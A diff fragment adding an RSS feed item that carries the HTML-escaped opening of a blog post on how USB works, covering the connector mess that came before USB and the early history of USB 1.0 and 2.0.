+            <link>https://amar-laksh.github.io/posts/how-usb-works-part-1/</link>
+            <guid>https://amar-laksh.github.io/posts/how-usb-works-part-1/</guid>
+            <description>&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;usb20_symbol.jpg&quot; alt=&quot;The USB 2.0 Symbol&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The beloved Universal Serial Bus is a very complex yet an ingenious solution to an age-old problem: Connecting Devices!&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;p&gt;To start with this apparently epic journey, let&#x27;s ask ourselves an easy enough question?&lt;&#x2F;p&gt;
+&lt;p&gt;HOW DO &lt;strong&gt;DEVICE A&lt;&#x2F;strong&gt; INTERACT WITH &lt;strong&gt;DEVICE B&lt;&#x2F;strong&gt;??&lt;&#x2F;p&gt;
+&lt;p&gt;It sure looks trivial at first but let&#x27;s just consider some of the issues involved:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;DEVICE A has a different hardware architecture than DEVICE B.&lt;&#x2F;li&gt;
+&lt;li&gt;DEVICE A needs to power itself while interacting with DEVICE B.&lt;&#x2F;li&gt;
+&lt;li&gt;DEVICE A is actually a hub &amp;amp; needs to power DEVICE C which wants to communicate with DEVICE B.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;It seems  quite clear that these things can get out of hands &lt;em&gt;rather quickly&lt;&#x2F;em&gt;, although...&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;there_is_always_a_way.jpg&quot; alt=&quot;Something Cool you can&#x27;t see&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;So, by the end of this series I hope to answer at least the most common queries related to USB:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Why does USB have to plugged in a specific way?&lt;&#x2F;li&gt;
+&lt;li&gt;A single USB port can support 127 devices, but How?&lt;&#x2F;li&gt;
+&lt;li&gt;How come USB HID Devices do not require multiple drivers?&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h2 id=&quot;but-first-let-s-talk-history&quot;&gt;BUT FIRST, LET&#x27;S TALK HISTORY!&lt;&#x2F;h2&gt;
+&lt;p&gt;The USB Specification broadly came in three waves:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;USB 1.0&lt;&#x2F;li&gt;
+&lt;li&gt;USB 2.0&lt;&#x2F;li&gt;
+&lt;li&gt;USB 3.0&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;&lt;strong&gt;The USB 1.x Era (1994-1998)&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;This was the early 90s and people were used to:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;A PS&#x2F;2 Port for their PS&#x2F;2 Devices wiith the PS&#x2F;2 Connectors.&lt;&#x2F;li&gt;
+&lt;li&gt;A Serial Port for their Serial Devices with the RS-232 Connectors.&lt;&#x2F;li&gt;
+&lt;li&gt;A Game Port for their Gaming Devices with the DA-15 Connectors.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;Yes, There were many ports and even more connectors in a giant tangled mess in every cupboard
+but people didn&#x27;t complain much, they simply did not have any alternate. The fate of the PC world
+was sealed into different pins numbers and sizes.&lt;&#x2F;p&gt;
+&lt;p&gt;On 11th November 1994, however, a young Intel architect by the name of Ajay Bhatt, along with the
+contributions from the USB-IF (USB Implementers Forum) published a specification for the USB 0.7.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;TYPE_A.jpg&quot; alt=&quot;Low Speed USB Type-A Close-Up Shot&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;With the USB specification, the USB-IF had set out to pave the way for replacing an entire pile of different connectors with just one cable; the USB or more specifically the low-speed USB Type-A.&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;p&gt;After an year of incremental development, the USB-IF presented the USB 1.0 specification in the November of &#x27;95
+. This version had support for the pre-existing &lt;strong&gt;low-speed&lt;&#x2F;strong&gt; 1.5 Mbit&#x2F;s which was ideal for low data
+rate devices like Joysticks and finally for data rates upto 12Mbit&#x2F;s which was called &lt;strong&gt;full-speed&lt;&#x2F;strong&gt;.
+The 12Mbit&#x2F;s rate was intended mainly for the use in disks drives.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;USB 2.x Era (2000-2008)&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;By now, everyone had recognised the magic of the ubiqitous USB ports. In the April of 2000, the USB-IF came out with a still better version; The USB 2.0 which added the High Speed data rates of 480 Mbit&#x2F;s.&lt;&#x2F;p&gt;
+</description>
+        </item>
+    </channel>
+</rss>
